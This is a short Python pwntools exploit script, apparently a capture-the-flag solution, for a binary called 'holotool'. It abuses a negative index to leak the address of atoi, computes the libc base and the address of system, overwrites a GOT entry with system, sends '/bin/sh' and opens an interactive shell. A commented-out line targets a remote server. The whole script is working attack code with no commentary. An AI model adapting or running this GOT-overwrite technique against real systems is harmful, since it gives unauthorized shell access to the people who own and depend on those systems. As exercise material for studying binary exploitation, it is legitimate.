from pwn import *
import struct
context.arch = "amd64"
p = process('./share/holotool')
# p = remote('140.115.59.7',10005)
libc = ELF('./share/libc.so.6')
print("input 1")
pause()
p.send(b"1")
print("input -1")
pause()
p.send(b"-1")
atoi = u64(p.recvuntil('\nYT')[635:641].ljust(8,b'\x00'))
syscalls = atoi - libc.sym['atoi'] + libc.sym['system']

success('atoi 0x%x',libc.sym['atoi'])
success('libc base: 0x%x',atoi - libc.sym['atoi'] )

success('system: 0x%x',syscalls)

print("send 2 (edit Got)")
pause()
p.send(b"2")
print("send -1 choose VT")
pause()
p.send(b"-1")

print("send 1 write name")
pause()
p.send(b"1")

print("send address to got")
pause()
p.send(p64(syscalls))

print("send /bin/sh")
pause()
p.send(b"/bin/sh")

p.interactive()